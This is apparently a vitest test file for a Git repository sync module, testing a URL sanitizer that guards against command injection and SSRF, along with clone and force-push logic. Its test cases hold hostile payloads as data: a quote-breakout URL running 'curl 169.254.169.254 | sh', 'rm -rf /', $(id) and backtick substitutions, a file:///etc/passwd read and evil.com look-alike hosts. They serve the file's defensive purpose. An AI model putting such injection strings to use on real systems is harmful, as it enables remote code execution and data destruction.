import { describe, it, expect } from 'vitest';
import { GitRepoSync, sanitizeRepoUrl } from './GitRepoSync';
import type { CommandRunner } from './GitManager';

/** A fake CommandRunner that records every command and replies from a scripted matcher. */
function fakeRunner(
  reply: (command: string) => { exitCode?: number; stdout?: string; stderr?: string },
): { runner: CommandRunner; commands: string[] } {
  const commands: string[] = [];
  const runner: CommandRunner = {
    async runCommand(_workspaceId, command) {
      commands.push(command);
      const r = reply(command);
      return { exitCode: r.exitCode ?? 0, stdout: r.stdout ?? '', stderr: r.stderr ?? '' };
    },
  };
  return { runner, commands };
}

const URL = 'https://x-access-token:ghs_tok@github.com/navbharatai-apps/app-u1-todo.git';

describe('sanitizeRepoUrl — C2 host command-injection + SSRF guard', () => {
  it('accepts both legit GitHub auth forms and rebuilds them faithfully', () => {
    expect(sanitizeRepoUrl('https://github.com/owner/repo')).toBe('https://github.com/owner/repo');
    expect(sanitizeRepoUrl('https://github.com/owner/repo.git')).toBe('https://github.com/owner/repo.git');
    // <token>@ form (route import)
    expect(sanitizeRepoUrl('https://ghp_abc123@github.com/o/r')).toBe('https://ghp_abc123@github.com/o/r');
    // x-access-token:<token>@ form (GitHub App installation token — used by pushAll)
    expect(sanitizeRepoUrl('https://x-access-token:ghs_tok@github.com/navbharatai-apps/app-u1-todo.git'))
      .toBe('https://x-access-token:ghs_tok@github.com/navbharatai-apps/app-u1-todo.git');
  });

  it('REJECTS the command-injection payload (quote-breakout) that reached the host shell', () => {
    // The real exploit: break out of git clone "<url>" and run arbitrary host commands.
    expect(sanitizeRepoUrl('https://github.com/o/r"; curl 169.254.169.254 | sh; echo "')).toBeNull();
    expect(sanitizeRepoUrl('https://github.com/o/r`whoami`')).toBeNull();
    expect(sanitizeRepoUrl('https://github.com/o/r$(id)')).toBeNull();
  });

  it('REJECTS SSRF / non-github targets and non-https schemes', () => {
    expect(sanitizeRepoUrl('file:///etc/passwd')).toBeNull();
    expect(sanitizeRepoUrl('http://github.com/o/r')).toBeNull();          // must be https
    expect(sanitizeRepoUrl('https://169.254.169.254/o/r')).toBeNull();    // cloud metadata
    expect(sanitizeRepoUrl('https://localhost/o/r')).toBeNull();
    expect(sanitizeRepoUrl('https://github.com.evil.com/o/r')).toBeNull();// look-alike host
    expect(sanitizeRepoUrl('https://github.com:22/o/r')).toBeNull();      // explicit port
    expect(sanitizeRepoUrl('git@github.com:o/r.git')).toBeNull();         // ssh form
  });

  it('REJECTS a userinfo look-alike that tries to smuggle a second host', () => {
    // `a@evil.com` in the userinfo → username contains `@`/`.` (or the real host becomes evil.com) → rejected.
    expect(sanitizeRepoUrl('https://a@evil.com@github.com/o/r')).toBeNull();
    expect(sanitizeRepoUrl('https://a@github.com@evil.com/o/r')).toBeNull();
  });

  it('REJECTS wrong segment count (owner/repo only); traversal normalizes to a benign 2-seg path', () => {
    expect(sanitizeRepoUrl('https://github.com/o')).toBeNull();            // one segment
    expect(sanitizeRepoUrl('https://github.com/o/r/extra')).toBeNull();    // three segments
    // Traversal that COLLAPSES to a single segment is rejected…
    expect(sanitizeRepoUrl('https://github.com/o/r/../../../etc')).toBeNull();
    // …and traversal that normalizes to a clean two-segment path is simply a (nonexistent) repo path —
    // NOT a traversal escape and NOT injectable, so accepting it is correct/harmless.
    expect(sanitizeRepoUrl('https://github.com/../../etc/x')).toBe('https://github.com/etc/x');
  });

  it('REJECTS a token containing shell metachars (percent-encoded by URL → fails the id class)', () => {
    expect(sanitizeRepoUrl('https://tok"$(id)@github.com/o/r')).toBeNull();
  });

  it('returns null for empty / garbage input (safe no-op upstream)', () => {
    expect(sanitizeRepoUrl('')).toBeNull();
    expect(sanitizeRepoUrl('not a url')).toBeNull();
    expect(sanitizeRepoUrl(undefined as unknown as string)).toBeNull();
  });
});

describe('GitRepoSync sink refuses an unsafe URL before it reaches git', () => {
  it('hydrateFromRepo skips (no command run) on an injection URL', async () => {
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_HYDRATED' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo('https://github.com/o/r"; rm -rf / ; echo "');
    expect(res).toEqual({ hydrated: false, hadFiles: false, skipped: true });
    expect(commands.length).toBe(0); // NEVER handed to the shell
  });
  it('pushAll skips (no command run) on an injection URL', async () => {
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_PUSHED' }));
    const res = await new GitRepoSync(runner, 'ws1').pushAll('https://evil.com/o/r', 'main', 'x');
    expect(res.skipped).toBe(true);
    expect(commands.length).toBe(0);
  });
});

describe('GitRepoSync.hydrateFromRepo', () => {
  it('overlays the repo onto the sandbox when the repo has real content (resume restore)', async () => {
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_HYDRATED' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL);
    expect(res).toEqual({ hydrated: true, hadFiles: false, skipped: false });
    expect(commands[0]).toContain('git clone');
    expect(commands[0]).toContain(URL); // the authed URL is handed to git
    expect(commands[0]).toContain('package.json'); // only overlays when the REPO has a built project
  });

  it('keeps the scaffold (no restore) when the repo is new/empty (first build)', async () => {
    const { runner } = fakeRunner(() => ({ stdout: 'NB_EMPTY_REPO' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL);
    expect(res).toEqual({ hydrated: false, hadFiles: false, skipped: false });
  });

  it('for an EXPLICIT import, overlays ANY repo content — not just package.json/src', async () => {
    // The import path (overlayAnyContent) must clone+overlay a repo with no root package.json or
    // src/ (e.g. a Python/static/monorepo project) — the auto-hydrate guard would wrongly skip it.
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_HYDRATED' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL, { overlayAnyContent: true });
    expect(res).toEqual({ hydrated: true, hadFiles: false, skipped: false });
    // The content test is the "any file besides .git" form, NOT the package.json/src form.
    expect(commands[0]).toContain('-not -name .git');
    expect(commands[0]).not.toContain('/tmp/nbhydrate/package.json');
    expect(commands[0]).toContain('git clone');
  });

  it('degrades to skipped on a clone failure (no network / no git)', async () => {
    const { runner } = fakeRunner(() => ({ stdout: 'NB_CLONE_FAIL' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL);
    expect(res.skipped).toBe(true);
    expect(res.hydrated).toBe(false);
  });

  it('own-repo hydrate tries the WORK branch, then the base branch, then the default clone (in order)', async () => {
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_HYDRATED' }));
    const res = await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL, { branch: 'navbharatai/work', fallbackBranch: 'main', overlayAnyContent: true });
    expect(res.hydrated).toBe(true);
    const cmd = commands[0];
    // Branch-specific clones are emitted, work branch BEFORE the base branch, then a plain default clone.
    const iWork = cmd.indexOf('-b "navbharatai/work"');
    const iMain = cmd.indexOf('-b "main"');
    const iPlain = cmd.lastIndexOf('git clone --depth 1 "'); // the no-`-b` fallback
    expect(iWork).toBeGreaterThan(-1);
    expect(iMain).toBeGreaterThan(iWork);
    expect(iPlain).toBeGreaterThan(iMain);
    // Each attempt cleans the temp dir so a failed `-b <missing>` clone never blocks the next.
    expect(cmd).toContain('rm -rf /tmp/nbhydrate');
  });

  it('no branch opts → a single plain clone, no -b flag (original behaviour preserved)', async () => {
    const { runner, commands } = fakeRunner(() => ({ stdout: 'NB_HYDRATED' }));
    await new GitRepoSync(runner, 'ws1').hydrateFromRepo(URL);
    expect(commands[0]).not.toContain('-b "'); // no branch flag when none requested
    expect(commands[0]).toContain('git clone --depth 1 "');
  });

  it('skips with no url, and never throws when the runner rejects', async () => {
    const noUrl = await new GitRepoSync(fakeRunner(() => ({})).runner, 'ws1').hydrateFromRepo('');
    expect(noUrl).toEqual({ hydrated: false, hadFiles: false, skipped: true });

    const throwing: CommandRunner = { async runCommand() { throw new Error('no shell'); } };
    const res = await new GitRepoSync(throwing, 'ws1').hydrateFromRepo(URL);
    expect(res.skipped).toBe(true);
  });
});

describe('GitRepoSync.pushAll', () => {
  it('commits and force-pushes HEAD to the branch', async () => {
    const { runner, commands } = fakeRunner((c) => {
      if (c.includes('git commit')) return { stdout: 'NB_COMMITTED' };
      if (c.includes('git push')) return { stdout: 'NB_PUSHED' };
      return {};
    });
    const res = await new GitRepoSync(runner, 'ws1').pushAll(URL, 'main', 'build: todo app');
    expect(res).toEqual({ pushed: true, noChange: false, skipped: false });
    const push = commands.find((c) => c.includes('git push'));
    expect(push).toContain('HEAD:main');
    expect(push).toContain('--force');
  });

  it('reports noChange when there was nothing to commit (still pushes the existing HEAD)', async () => {
    const { runner } = fakeRunner((c) => {
      if (c.includes('git commit')) return { stdout: 'NB_NOCHANGE' };
      if (c.includes('git push')) return { stdout: 'NB_PUSHED' };
      return {};
    });
    const res = await new GitRepoSync(runner, 'ws1').pushAll(URL, 'main', 'noop');
    expect(res).toEqual({ pushed: true, noChange: true, skipped: false });
  });

  it('degrades to skipped when the push fails', async () => {
    const { runner } = fakeRunner((c) => {
      if (c.includes('git commit')) return { stdout: 'NB_COMMITTED' };
      if (c.includes('git push')) return { stdout: 'NB_PUSHFAIL' };
      return {};
    });
    const res = await new GitRepoSync(runner, 'ws1').pushAll(URL, 'main', 'x');
    expect(res.pushed).toBe(false);
    expect(res.skipped).toBe(true);
  });

  it('sanitizes the branch name and commit message against shell injection', async () => {
    const { runner, commands } = fakeRunner((c) => {
      if (c.includes('git commit')) return { stdout: 'NB_COMMITTED' };
      if (c.includes('git push')) return { stdout: 'NB_PUSHED' };
      return {};
    });
    await new GitRepoSync(runner, 'ws1').pushAll(URL, 'feat/$(rm -rf)`evil`', 'msg "with" $danger `cmd`');
    const commit = commands.find((c) => c.includes('git commit'))!;
    const push = commands.find((c) => c.includes('git push'))!;
    expect(commit).not.toContain('`');
    expect(commit).not.toContain('$danger');
    expect(push).toContain('HEAD:feat/'); // branch prefix kept
    expect(push).not.toContain('$('); // shell metachars stripped from the ref
    expect(push).not.toContain('`');
  });

  it('skips with no url and never throws when the runner rejects', async () => {
    const noUrl = await new GitRepoSync(fakeRunner(() => ({})).runner, 'ws1').pushAll('', 'main', 'x');
    expect(noUrl.skipped).toBe(true);

    const throwing: CommandRunner = { async runCommand() { throw new Error('no shell'); } };
    const res = await new GitRepoSync(throwing, 'ws1').pushAll(URL, 'main', 'x');
    expect(res.skipped).toBe(true);
  });
});
